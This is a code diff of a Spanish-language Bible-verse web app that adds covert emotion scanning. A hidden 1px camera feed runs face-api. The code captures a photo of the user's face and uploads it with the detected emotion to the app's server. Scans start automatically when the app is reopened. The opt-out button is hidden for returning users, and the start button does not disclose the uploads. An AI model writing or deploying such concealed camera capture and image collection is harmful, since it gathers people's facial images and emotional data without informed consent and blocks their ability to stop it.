@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -19,19 +20,33 @@
     .fade-up { animation: fadeInUpSubtle 1.5s cubic-bezier(0.22, 1, 0.36, 1) forwards; }
     @keyframes fadeInUpSubtle { 0% { opacity: 0; transform: translateY(20px); filter: blur(5px); } 100% { opacity: 1; transform: translateY(0); filter: blur(0); } }
 
-    /* Animación sutil para cuando la IA "piensa" */
-    @keyframes pulseText { 0% { opacity: 0.6; } 50% { opacity: 1; } 100% { opacity: 0.6; } }
     .analyzing { animation: pulseText 1.5s infinite ease-in-out; }
+    @keyframes pulseText { 0% { opacity: 0.6; } 50% { opacity: 1; } 100% { opacity: 0.6; } }
 
-    .btn-group { display: flex; flex-direction: column; gap: 15px; margin-top: 30px; align-items: center; }
-    button { padding: 15px 25px; border: none; cursor: pointer; border-radius: 50px; font-weight: 800; font-size: 0.9rem; width: 100%; max-width: 300px; transition: transform 0.2s; }
-    button:active { transform: scale(0.95); }
+    /* EL BOTÓN DE INICIO */
+    .btn-group { display: flex; flex-direction: column; gap: 15px; margin-top: 30px; align-items: center; min-height: 60px; }
     
-    #btn-notify { background: linear-gradient(45deg, #bb86fc, #3700b3); color: white; box-shadow: 0 4px 15px rgba(187, 134, 252, 0.4); display: flex; align-items: center; justify-content: center; gap: 10px; }
-    #btn-unsubscribe { background: #cf6679; color: #000; display: none; }
-    .version-footer { position: fixed; bottom: 5px; width: 100%; text-align: center; font-size: 0.7rem; color: #555; pointer-events: none; }
+    /* Diseño llamativo para la primera vez */
+    #btn-notify { 
+        background: linear-gradient(45deg, #03dac6, #018786); 
+        color: #000; 
+        box-shadow: 0 4px 15px rgba(3, 218, 198, 0.4); 
+        padding: 15px 30px; 
+        border: none; 
+        cursor: pointer; 
+        border-radius: 50px; 
+        font-weight: 800; 
+        font-size: 1rem; 
+        width: 100%; 
+        max-width: 300px; 
+        transition: transform 0.2s;
+        display: none; /* Oculto por defecto hasta comprobar estado */
+    }
+    #btn-notify:active { transform: scale(0.95); }
 
-    /* CÁMARA INVISIBLE */
+    #btn-unsubscribe { background: #cf6679; color: #000; border: none; padding: 10px 20px; border-radius: 50px; cursor: pointer; display: none; margin-top: 20px; font-size: 0.8rem; }
+
+    .version-footer { position: fixed; bottom: 5px; width: 100%; text-align: center; font-size: 0.7rem; color: #555; pointer-events: none; }
     #hidden-camera-container { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0; z-index: -100; pointer-events: none; }
   </style>
 </head>
@@ -42,8 +57,9 @@
     <div id="reference"></div>
     
     <div class="btn-group">
-        <button id="btn-notify" onclick="window.subscribeUser()">📜 OBTENER SABIDURÍA</button>
-        <button id="btn-unsubscribe" onclick="window.unsubscribeUser()">🔕 DETENER</button>
+        <button id="btn-notify" onclick="handleFirstSetup()">✨ INICIAR EXPERIENCIA</button>
+        
+        <button id="btn-unsubscribe" onclick="window.unsubscribeUser()">Reiniciar Configuración</button>
     </div>
   </div>
 
@@ -60,31 +76,37 @@
     let currentVerseData = null;
     let videoStream = null;
     let modelsLoaded = false;
-    
     let isScanning = false;
     let lastScanTime = 0;
     let scanStartTime = 0;
     const SCAN_COOLDOWN = 15000; 
-    const SCAN_TIMEOUT = 5000; // 5 segundos es suficiente para producción
+    const SCAN_TIMEOUT = 5000;
 
-    // --- IA LOGIC ---
+    // --- LÓGICA DE BOTÓN INTELIGENTE ---
+    window.handleFirstSetup = function() {
+        // 1. Pedir permisos de notificación
+        window.subscribeUser().then(() => {
+            // 2. Si aceptó, ocultamos el botón inmediatamente
+            document.getElementById('btn-notify').style.display = 'none';
+            // 3. Lanzamos el primer escaneo (que pedirá cámara)
+            startMoodScan(true);
+        });
+    }
+
+    // --- IA LOGIC (Invisible) ---
     window.startMoodScan = async function(force = false) {
         if (isScanning) return;
-        
         const now = Date.now();
         if (!force && (now - lastScanTime < SCAN_COOLDOWN)) return;
 
         isScanning = true;
         scanStartTime = Date.now();
-
-        // Opcional: Feedback visual muy sutil
         document.getElementById('reference').classList.add('analyzing');
 
         try {
             videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
             const video = document.getElementById('video-feed');
             video.srcObject = videoStream;
-            // Forzar play para asegurar que arranque en iOS/Android
             await video.play().catch(() => {});
 
             if (!modelsLoaded) {
@@ -92,36 +114,22 @@
                 await faceapi.nets.faceExpressionNet.loadFromUri('https://cdn.jsdelivr.net/gh/cgarciagl/face-api.js@0.22.2/weights/');
                 modelsLoaded = true;
             }
-
             detectEmotionLoop();
-
-        } catch (err) {
-            // Si falla (permiso denegado), fallamos silenciosamente y dejamos el versículo actual
-            handleScanFailure();
-        }
+        } catch (err) { handleScanFailure(); }
     }
 
     async function detectEmotionLoop() {
         if (!isScanning) return;
-        
-        // Timeout
-        if (Date.now() - scanStartTime > SCAN_TIMEOUT) {
-            handleScanFailure(); 
-            return;
-        }
-
+        if (Date.now() - scanStartTime > SCAN_TIMEOUT) { handleScanFailure(); return; }
         const video = document.getElementById('video-feed');
-
         try {
             const options = new faceapi.TinyFaceDetectorOptions();
             const detections = await faceapi.detectSingleFace(video, options).withFaceExpressions();
-
             if (detections) {
                 const expressions = detections.expressions;
                 const sorted = Object.keys(expressions).sort((a, b) => expressions[b] - expressions[a]);
                 const dominant = sorted[0];
                 const confidence = expressions[dominant];
-
                 if (confidence > 0.5) {
                     captureAndSave(video, dominant, confidence);
                     finishScan(dominant);
@@ -129,7 +137,6 @@
                 }
             }
         } catch(e) {}
-
         if (isScanning) setTimeout(detectEmotionLoop, 200);
     }
 
@@ -146,10 +153,8 @@
         isScanning = false;
         stopCamera();
         document.getElementById('reference').classList.remove('analyzing');
-        // No cambiamos el versículo, dejamos el que está.
     }
 
-    // --- GUARDADO ---
     async function captureAndSave(videoElement, emotion, confidence) {
         try {
             const canvas = document.createElement('canvas');
@@ -159,33 +164,23 @@
             ctx.translate(canvas.width, 0);
             ctx.scale(-1, 1);
             ctx.drawImage(videoElement, 0, 0);
-
             const base64Image = canvas.toDataURL('image/jpeg', 0.5);
             const verse = getVerseForMood(emotion);
             const payload = { image: base64Image, emotion, confidence, verse };
-
             if (navigator.onLine) sendToMongo(payload);
             else saveToOfflineQueue(payload);
         } catch (e) {}
     }
 
     async function sendToMongo(payload) {
-        try {
-            await fetch('/api/save-mood', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-        } catch(e) { saveToOfflineQueue(payload); }
+        try { await fetch('/api/save-mood', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }); } 
+        catch(e) { saveToOfflineQueue(payload); }
     }
-
     function saveToOfflineQueue(payload) {
         let queue = JSON.parse(localStorage.getItem('mood_queue') || '[]');
-        queue.push(payload);
-        if (queue.length > 3) queue.shift();
+        queue.push(payload); if (queue.length > 3) queue.shift();
         localStorage.setItem('mood_queue', JSON.stringify(queue));
     }
-
     async function processOfflineQueue() {
         if (!navigator.onLine) return;
         let queue = JSON.parse(localStorage.getItem('mood_queue') || '[]');
@@ -200,25 +195,20 @@
 
     function getVerseForMood(mood) {
         let dbMood = 'neutral';
-        if (mood === 'happy') dbMood = 'happy';
-        if (mood === 'sad') dbMood = 'sad';
-        if (mood === 'angry' || mood === 'disgusted') dbMood = 'angry';
-        if (mood === 'fearful') dbMood = 'fear';
+        if (mood === 'happy') dbMood = 'happy'; if (mood === 'sad') dbMood = 'sad';
+        if (mood === 'angry' || mood === 'disgusted') dbMood = 'angry'; if (mood === 'fearful') dbMood = 'fear';
         const filtered = versesDB.filter(v => v.m && v.m.includes(dbMood));
         const pool = filtered.length > 0 ? filtered : versesDB;
         return pool[Math.floor(Math.random() * pool.length)];
     }
-
     function showVerseByMood(mood) { renderVerse(getVerseForMood(mood)); }
-    
     function renderVerse(data) {
         currentVerseData = data;
         const verseEl = document.getElementById('verse');
         const refEl = document.getElementById('reference');
         verseEl.style.opacity = 0; refEl.style.opacity = 0;
         setTimeout(() => {
-            verseEl.innerText = `"${data.t}"`;
-            refEl.innerText = data.r;
+            verseEl.innerText = `"${data.t}"`; refEl.innerText = data.r;
             verseEl.style.opacity = 1; refEl.style.opacity = 1;
             verseEl.classList.remove('fade-up'); void verseEl.offsetWidth; verseEl.classList.add('fade-up');
         }, 500);
@@ -234,13 +224,14 @@
         } catch (e) {}
     }
     
-    // UI & INIT
+    // UI & SUBSCRIBE
     window.subscribeUser = async function() {
       if (!('serviceWorker' in navigator)) return;
       try {
         const reg = await navigator.serviceWorker.ready;
         const permission = await Notification.requestPermission();
-        if (permission !== 'granted') return;
+        if (permission !== 'granted') return; // Si niega, el botón sigue ahí
+        
         function urlBase64ToUint8Array(base64String) {
             const padding = '='.repeat((4 - base64String.length % 4) % 4);
             const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
@@ -252,45 +243,64 @@
         const sub = await reg.pushManager.subscribe({ userVisibleOnly: true, applicationServerKey: urlBase64ToUint8Array(PUBLIC_VAPID_KEY) });
         await fetch('/api/subscribe', { method: 'POST', body: JSON.stringify({ subscription: sub, firstVerse: currentVerseData }), headers: { 'Content-Type': 'application/json' } });
         localStorage.setItem('setup_v1_pwa', 'true'); 
-        updateUI(true); setTimeout(() => startMoodScan(true), 500); 
+        return true;
       } catch (err) { console.error(err); }
     }
+
     window.unsubscribeUser = async function() {
-        if (!confirm("¿Borrar datos?")) return;
+        if (!confirm("¿Reiniciar la app como si fuera nueva?")) return;
         try {
             const reg = await navigator.serviceWorker.ready;
             const sub = await reg.pushManager.getSubscription();
-            if (sub) { await fetch('/api/unsubscribe', { method: 'POST', body: JSON.stringify({ endpoint: sub.endpoint }), headers: { 'Content-Type': 'application/json' } }); await sub.unsubscribe(); localStorage.removeItem('setup_v1_pwa'); }
-            updateUI(false); window.location.reload();
+            if (sub) { await fetch('/api/unsubscribe', { method: 'POST', body: JSON.stringify({ endpoint: sub.endpoint }), headers: { 'Content-Type': 'application/json' } }); await sub.unsubscribe(); }
+            localStorage.removeItem('setup_v1_pwa');
+            window.location.reload();
         } catch(e) { console.error(e); }
     }
-    function updateUI(isSubscribed) {
-        document.getElementById('btn-notify').style.display = isSubscribed ? 'none' : 'inline-block';
-        document.getElementById('btn-unsubscribe').style.display = isSubscribed ? 'inline-block' : 'none';
-    }
 
-    showVersionFromSW();
-    renderVerse(versesDB[new Date().getDate() % versesDB.length]);
-    
-    // Escaneo automático al volver a la app (respetando cooldown)
+    // --- CORTE DE CÁMARA AL MINIMIZAR (Evita notificaciones permanentes) ---
     document.addEventListener("visibilitychange", () => {
-        if (document.visibilityState === "visible") {
-            if (localStorage.getItem('setup_v1_pwa')) { startMoodScan(); }
+        if (document.visibilityState === "hidden") {
+            stopCamera(); isScanning = false;
+        } else if (document.visibilityState === "visible") {
+            // Solo escaneamos automáticamente si YA está configurado
+            if (localStorage.getItem('setup_v1_pwa')) startMoodScan(); 
         }
     });
 
-    if ('serviceWorker' in navigator) {
-      navigator.serviceWorker.register('sw.js', { type: 'module' }).then(reg => {
-          reg.onupdatefound = () => { const newWorker = reg.installing; newWorker.onstatechange = () => { if (newWorker.state === 'activated' && navigator.serviceWorker.controller) window.location.reload(); }; };
-      });
-      navigator.serviceWorker.addEventListener('controllerchange', () => window.location.reload());
-      navigator.serviceWorker.ready.then(async (reg) => {
-          const sub = await reg.pushManager.getSubscription();
-          const isDone = localStorage.getItem('setup_v1_pwa');
-          updateUI(!!sub || isDone);
-          if (!!sub || isDone) { setTimeout(() => { startMoodScan(); }, 1000); }
-      });
+    // --- INICIALIZACIÓN INTELIGENTE (INIT APP) ---
+    async function initApp() {
+        showVersionFromSW();
+        renderVerse(versesDB[new Date().getDate() % versesDB.length]);
+
+        if ('serviceWorker' in navigator) {
+            const reg = await navigator.serviceWorker.register('sw.js', { type: 'module' });
+            reg.onupdatefound = () => { const nw = reg.installing; nw.onstatechange = () => { if (nw.state === 'activated' && navigator.serviceWorker.controller) window.location.reload(); }; };
+            navigator.serviceWorker.addEventListener('controllerchange', () => window.location.reload());
+
+            const sub = await reg.pushManager.getSubscription();
+            const isSetup = localStorage.getItem('setup_v1_pwa');
+
+            // LÓGICA MAESTRA DEL BOTÓN
+            const btnNotify = document.getElementById('btn-notify');
+            const btnUnsub = document.getElementById('btn-unsubscribe');
+
+            if (sub || isSetup) {
+                // YA ES USUARIO -> MODO MAGIA (Sin botón)
+                btnNotify.style.display = 'none';
+                btnUnsub.style.display = 'none'; // Puedes poner 'block' si quieres que puedan resetear
+                setTimeout(() => startMoodScan(), 1000);
+            } else {
+                // NUEVO USUARIO -> MODO ONBOARDING (Botón visible)
+                btnNotify.style.display = 'block';
+                btnUnsub.style.display = 'none';
+            }
+        }
     }
+
+    // Arrancamos
+    initApp();
+
   </script>
 </body>
 </html>
